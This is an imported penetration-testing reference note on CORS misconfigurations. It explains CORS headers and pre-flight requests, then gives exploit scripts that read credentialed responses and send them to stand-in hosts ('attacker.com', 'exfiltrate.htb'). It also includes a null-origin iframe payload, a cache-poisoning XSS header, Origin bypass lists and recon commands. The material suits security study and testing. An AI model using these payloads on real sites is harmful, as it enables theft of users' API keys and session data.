---
technique: "CORS"
family: "client-side"
severity_hint: "medium"
tags: ["CORS", "Account Takeover", "CSRF", "XSS", "Cache Poisoning", "HTTP"]
source: "_raw/Web attacks/Web Attacks/CORS.md"
source_sha256: "600a3b80fa011b53b5dc0fd10b76f1eb0dfba61100e79083373de4c622008bac"
curator_version: 2
review_status: imported-unreviewed
---

# CORS

> Family: **client-side** · Severity hint: **medium** · Tags: CORS, Account Takeover, CSRF, XSS, Cache Poisoning, HTTP
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `python: fetch(url, {`
- `jsx: function handler() {`
- `python: OPTIONS /data HTTP/1.1`
- `python: HTTP/1.1 204 No Content`
- `jsx: <script>`
- `python: GET /sensitive-victim-data HTTP/1.1`
- `jsx: <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<scri`
- `jsx: <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>`
- `python: GET /api/requestApiKey HTTP/1.1`
- `python: https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`
- `python: GET /api/requestApiKey HTTP/1.1`
- `jsx: <script>`
- `html: <script>`
- `html: http://attackervulnerablesite.htb`
- `python: Origin:null`

## Playbook (operator notes)

# CORS

# What is CORS?

[Same-Origin Policy & CORS](https://app.notion.com/p/Same-Origin-Policy-CORS-5565034379a442989a2940a01f63e6a0?pvs=21) 

Cross-Origin Resource Sharing (CORS) standard **enables servers to define who can access their assets** and **which HTTP request methods are permitted** from external sources.

### Access-Control-Allow-Origin

This header is **issued by a server** in response to a cross-domain resource request initiated by a website, with the browser automatically adding an `Origin` header.

### Access-Control-Allow-Credentials

If set to `true`, the browser will transmit credentials.

```python
fetch(url, {
  credentials: 'include'  
})
```

```jsx
function handler() {
    if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
            console.log("Response received: ", xhr.responseText);
        } else {
            console.error("Request failed with status: ", xhr.status);
        }
    }
}
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://example.com');
xhr.setRequestHeader('Host', 'MySuperSecureHost'); // We can add different headers
xhr.onreadystatechange = handler;
xhr.send(''); // Access-Control-Allow-Origin: OurHost --> has to be set by the server
```

# CSRF Pre-flight request

- A **pre-flight request** using the `OPTIONS` method is sometimes required for cross-domain requests.
- It occurs when:
    - Non-standard HTTP methods are used (e.g., `PUT`).
    - Custom headers are included (e.g., `Special-Request-Header`).
    - Special `Content-Type` values are specified.
- The pre-flight request informs the server of the upcoming cross-origin request’s details.
- The **CORS protocol** checks whether the request is permitted before the actual request is made.
- The server’s response defines:
    - Allowed HTTP methods (e.g., `PUT`, `POST`, `OPTIONS`).
    - Allowed request headers (e.g., `Special-Request-Header`).
    - Whether credentials may be sent.
    - The `Access-Control-Max-Age` (how long the pre-flight response may be cached).
- If the request method and headers are permitted, the browser proceeds with the actual request.
- Even without a pre-flight request, responses must still include authorization headers for the browser to process them.
- Pre-flight checks add an **extra HTTP round-trip**, increasing overhead.
- The pre-flight mechanism was added to CORS to protect **legacy resources** from unintended requests with expanded methods/headers.
- The browser verifies:
    - The trusted origin.
    - Whether the requested method and headers are explicitly allowed.

```python
OPTIONS /data HTTP/1.1 
Host: <some website> 
... 
Origin: https://normal-website.com
Access-Control-Request-Method: PUT 
Access-Control-Request-Headers: Special-Request-Header
```

```python
HTTP/1.1 204 No Content 
... 
Access-Control-Allow-Origin: https://normal-website.com 
Access-Control-Allow-Methods: PUT, POST, OPTIONS 
Access-Control-Allow-Headers: Special-Request-Header 
Access-Control-Allow-Credentials: true 
Access-Control-Max-Age: 240
```

# Misconfigured CORS

[Advanced XSS and CSRF exploitation](https://app.notion.com/p/Advanced-XSS-and-CSRF-exploitation-08afda1cabd64f4da5a2d7cccf6311a7?pvs=21) 

- `Access-Control-Allow-Credentials: true` is required for most real attacks
- Exception if the victim's network location acts as a form of authentication
- This allows for the victim's browser to be used as a proxy, circumventing IP-based authentication to access intranet applications

### Reflection of `Origin` in `Access-Control-Allow-Origin`

While enabling CORS for multiple URLs, developers may dynamically generate the `Access-Control-Allow-Origin` header by copying the `Origin` header's value, which can introduce vulnerabilities. This is especially risky when an attacker uses a domain with a name designed to appear legitimate, potentially deceiving the validation logic.

```jsx
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://example.com/details',true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
       location='https://attacker.com/log?key='+this.responseText; // Example : API key gets returned
   };
</script>
```

### Exploiting the `null` Origin

The `null` origin, used in situations like redirects or local HTML files, can inadvertently allow any website to mimic a `null` origin through a sandboxed iframe, thereby bypassing CORS restrictions.

```python
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com 
Origin: null

HTTP/1.1 200 OK 
Access-Control-Allow-Origin: null 
Access-Control-Allow-Credentials: true
```

```jsx
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://example/details',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.com/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

```jsx
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
...
</script>"></iframe>
```

### Regular Expression Bypass Techniques

In domain whitelisting, it's important to test for potential bypass opportunities, such as appending an attacker's domain to a whitelisted domain or exploiting subdomain takeover vulnerabilities. Additionally, domain validation using regular expressions may miss certain domain naming nuances, creating additional bypass opportunities.

### From XSS inside a subdomain

The presence of even a single vulnerable subdomain within the whitelisted domains can open the door to CORS exploitation through other vulnerabilities, such as XSS (Cross-Site Scripting).  For example, an attacker with access to `sub.requester.com` could exploit the XSS vulnerability to bypass CORS policies and maliciously access resources on `provider.com`

```python
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://subdomain.vulnerable-website.com 
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```

```python
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

### **Breaking TLS with poorly configured CORS**

- Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP

```python
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=..

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

- In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application

### Server-side cache poisoning

Cross-Origin Resource Sharing (CORS) policies can be exploited if a web page reflects the contents of a custom HTTP header without proper encoding. The issue arises when a malicious response is cached by the browser due to the absence of the `Vary: Origin` header, allowing the cached response to be rendered directly when navigating to the URL. This can potentially trigger the execution of an injected script, enhancing the reliability of the attack by leveraging client-side caching.

```jsx
<script>
	function gotcha() { location=url }
	var req = new XMLHttpRequest();
	url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
	req.onload = gotcha;
	req.open('get', url, true);
	req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
	req.send();
</script>
```

### **Targeting the local network**

- Even if not configured to allow credentials an attacker might be able to target internal apps behind a firewall, reverse proxy or NAT that are publicly accessible
- If those apps do not require authentication data can be exfiltrated

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://172.16.0.2/data', true);
    xhr.onload = () => {
      location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script
```

### **Improper Origin Whitelist**

- A web application must check an origin against a whitelist of trusted origins before reflecting it
- Attacker might be able to bypass checks
- Common goal of web applications is to trust subdomains
    - `api.vulnerablesite.htb` validates incoming origin header by checking weather the string ends with `vulnerablesite.htb`

```html
http://attackervulnerablesite.htb
```

# Hunting

**Hunting method 1(Single target)**

1. Capture the target website and spider or crawl it using Burp
2. Use burp search look for Access-Control
3. Add CORS header like `Origin: attacker.com`
4. If the `Origin` is reflected in response →  Vulnerable to CORS

**Hunting method 2 (multiple targets including subdomains)**

1. Find subdomains [Subdomain Methodology](https://app.notion.com/p/Subdomain-Methodology-0a0140545aaf4db997ddb4a964fb3c4e?pvs=21) 
    1. `subfinder -d [target.com](http://target.com/) -o domains.txt`
2. Check alive hosts [Alive hosts](https://app.notion.com/p/Alive-hosts-fe49b7cd0dee4117a411430caed37e26?pvs=21) 
    1. `cat domains.txt | httpx | tee -a alive.txt`
3. Send each alive domain into Burp via proxy
    1. `Burp → Proxy → Interface → Specific address → 192.168.178.14`
    2. `alias send2burp='parallel -j 10 curl --proxy "[http://192.168.178.14:8080](http://192.168.178.14:8080/)" -sk 2>/dev/null'`
        1. `cat alive.txt | choose 0 | send2burp` 

**Automated way**

1. Find subdomains [Subdomain Methodology](https://app.notion.com/p/Subdomain-Methodology-0a0140545aaf4db997ddb4a964fb3c4e?pvs=21) 
    1. `subfinder -d [target.com](http://target.com/) -o domains.txt`
2. Check alive hosts [Alive hosts](https://app.notion.com/p/Alive-hosts-fe49b7cd0dee4117a411430caed37e26?pvs=21) 
    1. `cat domains.txt | httpx | tee -a alive.txt`
3. Grep all URLs using `waybackurls` and `gau` 
    1. `cat alive.txt | gau >> urls.txt`
    2. `cat alive.txt | waybackurls >> urls.txt`
    3. `cat urls.txt | sort -u > unique_urls.txt`
4. Use Scanner to find CORS miss configurations
    
    https://github.com/s0md3v/Corsy
    
    https://github.com/chenjj/CORScanner
    

# CORS Bypasses

```python
Origin:null
Origin:attacker.com
Origin:attacker.target.com
Origin:attackertarget.com
Origin:sub.attackertarget.com
Origin:attacker.com # And then change the method Get to post/Post to Get
Origin:sub.attacker target.com
Origin:sub.attacker%target.com
Origin:attacker.com/target.com
```

### XSSI (Cross-Site Script Inclusion) / JSONP

Cross-Site Script Inclusion (XSSI) is a vulnerability that exploits the Same Origin Policy's (SOP) non-applicability to resources included via the script tag, allowing attackers to access and read any included content. This vulnerability is particularly significant with dynamic JavaScript or JSONP, especially when cookies are used for authentication. Mitigation can be achieved using tools like the BurpSuite plugin, and by adding a 'callback' parameter in the request to bypass the CORS policy.

[XSSI (Cross-Site Script Inclusion)](https://book.hacktricks.xyz/pentesting-web/xssi-cross-site-script-inclusion)

Try to add a **`callback`** **parameter** in the request. Maybe the page was prepared to send the data as JSONP. In that case the page will send back the data with `Content-Type: application/javascript` which will bypass the CORS policy.

### Easy (useless?) bypass

Bypassing the `Access-Control-Allow-Origin` restriction can be done by a web application making a request for you. However, this doesn't send the victim's credentials due to the different domain.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): A tool that forwards your request with spoofed Origin header, bypassing the CORS policy. Example usage is with XMLHttpRequest.
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Another tool that makes its own request with specified parameters instead of forwarding your request.

### Iframe + Popup Bypass

[Iframes in XSS, CSP and SOP](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp)

### Other common Bypasses

- If **internal IPs aren't allowed**, they might **forgot forbidding 0.0.0.0** (works on Linux and Mac)
- If **internal IPs aren't allowed**, respond with a **CNAME** to **localhost** (works on Linux and Ma
- If **internal IPs aren't allowed** as DNS responses, you can respond **CNAMEs to internal services** such as www.corporate.internal.

---

XSSI

[CORS](https://kathan19.gitbook.io/howtohunt/cors/cors)

[CORS Bypasses](https://kathan19.gitbook.io/howtohunt/cors/cors_bypasses)

[CORS - Misconfigurations & Bypass](https://book.hacktricks.xyz/pentesting-web/cors-bypass)

## Source
Original note: `_raw/Web attacks/Web Attacks/CORS.md`
